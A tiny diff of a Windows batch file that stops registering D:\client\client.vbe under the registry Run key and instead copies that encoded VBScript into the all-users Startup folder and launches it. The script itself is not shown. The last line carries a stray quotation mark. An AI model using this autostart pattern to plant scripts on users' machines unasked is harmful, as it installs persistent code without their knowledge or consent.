@@ -1,2 +1,3 @@
-@echo off
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "client" /t REG_SZ /d "D:\client\client.vbe" /f 
+copy D:\client\client.vbe %SYSTEMDRIVE%\ProgramData\Microsoft\Windows\"Start Menu"\Programs\Startup
+
+D:\client\client.vbe"
